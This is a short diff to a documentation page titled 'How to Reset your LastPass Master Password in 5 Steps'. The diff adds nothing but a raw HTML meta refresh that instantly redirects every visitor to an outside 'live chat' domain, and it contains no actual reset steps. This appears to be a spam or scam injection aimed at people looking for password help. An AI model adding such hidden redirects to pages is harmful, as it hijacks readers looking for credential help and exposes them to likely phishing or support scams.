@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://accuratelivechat.com/">
+
+
 How to Reset your LastPass Master Password in 5 Steps 
 ============================================
 
